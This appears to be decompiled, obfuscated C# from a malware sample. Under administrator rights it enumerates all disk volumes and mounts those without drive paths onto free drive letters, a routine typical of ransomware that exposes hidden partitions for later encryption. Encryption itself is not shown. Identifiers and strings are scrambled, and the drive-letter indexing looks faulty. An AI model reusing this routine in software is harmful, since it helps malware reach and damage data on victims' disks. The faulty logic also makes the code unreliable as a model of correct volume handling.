using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace VyjVuXvolaw;

public static class SrTwmJlhYIVy
{
	public enum GdoaZrWuXNZ : uint
	{
		bOrmzaiLUBCcN,
		GiJSPWnunXCqUmij,
		utrzEOJeVg,
		xuEItNjeoPwWEr,
		awNYSivfMu,
		FYGEBptrGUrLGC,
		EVogFApGETDoRjrp
	}

	private sealed class qzsazOiGBBM
	{
		public uint ybFvWilPTfrk;

		public uint ZilqHlAcca;

		public char[] aUnVarHnarjHDbpD;

		public bool _003CMountVolumes_003Eb__0(string string_0)
		{
			if (GetVolumePathNamesForVolumeNameW(string_0, aUnVarHnarjHDbpD, ZilqHlAcca, ref ybFvWilPTfrk))
			{
				return aUnVarHnarjHDbpD.Length != 3;
			}
			return true;
		}
	}

	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("kernel32.dll")]
	public static extern GdoaZrWuXNZ GetDriveType([MarshalAs(UnmanagedType.LPStr)] string fWTsZKzBazHHH);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool GetVolumePathNamesForVolumeNameW(string inCREWLYzw, char[] QbcewMIzgJuIB, uint misLOdPsEBIN, ref uint soyFlwFIMP);

	[DllImport("kernel32.dll")]
	internal static extern bool SetVolumeMountPoint(string string_0, string string_1);

	[DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
	public static extern int FindFirstVolume(StringBuilder stringBuilder_0, int int_0);

	[DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
	public static extern bool FindNextVolume(int int_0, StringBuilder stringBuilder_0, int int_1);

	public static List<string> onixUfnHTQkc()
	{
		StringBuilder stringBuilder = new StringBuilder(1024);
		List<string> list = new List<string>();
		int int_ = FindFirstVolume(stringBuilder, 1024);
		do
		{
			list.Add(stringBuilder.ToString());
			Console.WriteLine(stringBuilder.ToString());
		}
		while (FindNextVolume(int_, stringBuilder, 1024));
		return list;
	}

	public static void naLQkWiYOZ()
	{
		if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			return;
		}
		try
		{
			qzsazOiGBBM CS_0024_003C_003E8__locals0 = new qzsazOiGBBM();
			string[] array = new string[26]
			{
				getString_0(107393740),
				getString_0(107393710),
				getString_0(107393288),
				getString_0(107393767),
				getString_0(107393757),
				getString_0(107393732),
				getString_0(107393752),
				getString_0(107393268),
				getString_0(107393750),
				getString_0(107393745),
				getString_0(107393340),
				getString_0(107393762),
				getString_0(107393293),
				getString_0(107393315),
				getString_0(107393310),
				getString_0(107393305),
				getString_0(107393263),
				getString_0(107393258),
				getString_0(107393285),
				getString_0(107393727),
				getString_0(107393705),
				getString_0(107393298),
				getString_0(107393715),
				getString_0(107393303),
				getString_0(107393275),
				getString_0(107393280)
			};
			string[] array2 = new string[array.Length];
			int num = 0;
			string[] array3 = array;
			foreach (string text in array3)
			{
				if (GetDriveType(text) == GdoaZrWuXNZ.GiJSPWnunXCqUmij)
				{
					array2[num++] = text;
				}
			}
			List<string> source = onixUfnHTQkc();
			CS_0024_003C_003E8__locals0.ybFvWilPTfrk = 0u;
			CS_0024_003C_003E8__locals0.ZilqHlAcca = 120u;
			CS_0024_003C_003E8__locals0.aUnVarHnarjHDbpD = new char[260];
			foreach (string item in source.Where((string string_0) => !GetVolumePathNamesForVolumeNameW(string_0, CS_0024_003C_003E8__locals0.aUnVarHnarjHDbpD, CS_0024_003C_003E8__locals0.ZilqHlAcca, ref CS_0024_003C_003E8__locals0.ybFvWilPTfrk) || CS_0024_003C_003E8__locals0.aUnVarHnarjHDbpD.Length != 3))
			{
				SetVolumeMountPoint(array2[num--], item);
				if (CRZFkRWzfSXjW.RiGciHwEXLcD)
				{
					try
					{
						Console.WriteLine(getString_0(107399077), array2[num--]);
					}
					catch (Exception)
					{
					}
				}
			}
		}
		catch (Exception ex2)
		{
			if (CRZFkRWzfSXjW.VLajbDNhoSbf)
			{
				try
				{
					File.AppendAllText(CRZFkRWzfSXjW.MGkBzYPheHDPb, getString_0(107399020) + ex2.Message);
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	static SrTwmJlhYIVy()
	{
		Strings.CreateGetStringDelegate(typeof(SrTwmJlhYIVy));
	}
}
